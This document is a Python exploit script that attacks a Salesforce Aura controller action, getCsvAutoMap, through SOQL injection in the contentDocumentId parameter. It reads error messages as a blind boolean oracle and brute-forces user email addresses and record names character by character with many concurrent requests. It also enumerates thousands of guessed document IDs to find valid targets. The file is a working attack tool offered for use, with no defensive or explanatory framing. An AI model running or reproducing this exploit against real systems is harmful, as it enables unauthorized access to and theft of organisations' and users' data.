import json
import string
import requests
import argparse
from tqdm import tqdm
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.urllib3.disable_warnings()

def positive(body):
    return "File is corrupted" in body or "Cannot invoke " in body or "Found unescaped quote" in body
     

def doAura(message, url, cookies, aura_context, aura_token):
    headers = {
        "Connection": "close",
        "sec-ch-ua-platform": "\"Linux\"",
        "X-SFDC-Request-Id": "514859000022c43b46",
        "X-SFDC-Page-Scope-Id": "47dcd798-04e0-4a8c-812f-82c5e07fc7d8",
        "X-SFDC-Page-Cache": "9d3b1f4279fd8c5e",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": cookies
    }
    data = f"message={message}&aura.context={aura_context}&aura.token={aura_token}"
    try:
        return requests.post(url, headers=headers, data=data, verify=False)
    except requests.RequestException as e:
        print(e)
        return None

def checkInjection(injection, url, cookies, aura_context, aura_token, documentId):
    message = """{"actions":[{"id":"304279;a","descriptor":"aura://CsvDataImportResourceFamilyController/ACTION$getCsvAutoMap","callingDescriptor":"UNKNOWN","params":{"entityApiName":"","contentDocumentId":\""""+documentId+"""' AND """+quote(injection)+""" AND ContentDocumentId != '"}}]}"""
    response = doAura(message, url, cookies, aura_context, aura_token)
    if response is None:
        return False

    return positive(response.text)

def validateDocumentIds(url, cookies, aura_context, aura_token, documentIds):
    actions = []
    for d in range(len(documentIds)):
         actions.append({"id":f"{d};a","descriptor":"aura://CsvDataImportResourceFamilyController/ACTION$getCsvAutoMap","callingDescriptor":"UNKNOWN","params":{"entityApiName":"","contentDocumentId":documentIds[d]}})
    
    r = doAura(json.dumps({"actions":actions}), url, cookies, aura_context, aura_token)
    if r is None or r.status_code != 200:
         return []
    resp = r.json()
    valid = []
    for i in range(len(resp["actions"])):
        if positive(json.dumps(resp["actions"][i])):
            valid.append(documentIds[i])

    return valid

"""
Used to generate documentIds for the injection
"""    

# encode and decode functions from https://stackoverflow.com/a/61646764
BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
def encode_base62(num):
    s = ""
    while num>0:
      num,r = divmod(num,62)
      s = BASE62[r]+s
    return s

def decode_base62(num):
   x,s = 1,0
   for i in range(len(num)-1,-1,-1):
      s = int(BASE62.index(num[i])) *x + s
      x*=62
   return s

# sf15to18 function from https://github.com/mslabina/sf15to18/blob/master/sf15to18.py
def sf15to18 (id):
	if not id:
		raise ValueError('No id given.')
	if not isinstance(id, str):
		raise TypeError('The given id isn\'t a string')
	if len(id) == 18:
		return id
	if len(id) != 15:
		raise ValueError('The given id isn\'t 15 characters long.')

	# Generate three last digits of the id
	for i in range(0,3):
		f = 0

		# For every 5-digit block of the given id
		for j in range(0,5):
			# Assign the j-th chracter of the i-th 5-digit block to c
			c = id[i * 5 + j]

			# Check if c is an uppercase letter
			if c >= 'A' and c <= 'Z':
				# Set a 1 at the character's position in the reversed segment
				f += 1 << j

		# Add the calculated character for the current block to the id
		id += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345'[f]

	return id


# Hypn's code:
def generate_ids(salesforce_id, quantity):
    prefix = salesforce_id[0:10]
    num = decode_base62(salesforce_id[10:15])

    if quantity < 0:
        direction = -1
    else:
        direction = 1

    ids = []
    for i in range(quantity * direction):
        next_num = num + ((i + 1) * direction)
        ids.append(sf15to18(prefix + encode_base62(next_num)))
    
    return ids
          
"""
MAIN
"""

def main(url, cookies, auraToken, auraContext, documentId, gen):
    s = (string.digits + string.ascii_lowercase + string.punctuation + " ").replace("%", "")
    if not gen:
        documentIds = [documentId]
    else:
        documentIds = generate_ids(documentId, 10000)
        print("Generated documentIds, checking which ones exist...")
        validDocumentIds = []
        for pos in tqdm(range(0, len(documentIds), 100)):
            valid = validateDocumentIds(url, cookies, auraContext, auraToken, documentIds[pos:pos+100])
            validDocumentIds += valid
        print(f"Found {len(validDocumentIds)} valid documentIds")
        documentIds = validDocumentIds
        documentIds.append(documentId)
    injections = [
        """OwnerId IN (SELECT Id FROM User WHERE email LIKE 'REPLACE%')""",
        """name LIKE 'REPLACE%'""",
    ]
    for col in injections:
        for i in documentIds:
            print(f"-------\nExtracting with injection \"{col}\" for documentId {i}")
            f = ""
            while True:
                found = False
                maybe = ""
                with ThreadPoolExecutor(max_workers=len(s)) as executor:
                    futures = {executor.submit(checkInjection, col.replace("REPLACE", f+c), url, cookies, auraContext, auraToken, i): c for c in s}
                    for future in as_completed(futures):
                        c = futures[future]
                        if future.result():
                            if c == "_":
                                maybe = c
                                continue
                            else:
                                f += c
                            found = True
                            print(f, end="\r")
                            break
                if not found:
                    if maybe:
                        f += maybe
                        print(f, end="\r")
                        continue
                    print(f"Extracted: {f}")
                    break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send aura post requests.')
    parser.add_argument('--url', required=True, help='The base URL for the request')
    parser.add_argument('--cookies', required=True, help='Cookies for the request')
    parser.add_argument('--aura_context', required=True, help='Aura context parameter')
    parser.add_argument('--aura_token', required=True, help='Aura token parameter')
    parser.add_argument('--document_id', required=False, help='Document ID to generate from')
    parser.add_argument('--gen', required=False, help='Generate documentIds', type=bool)
    args = parser.parse_args()

    main(args.url, args.cookies, args.aura_token, args.aura_context, args.document_id, args.gen)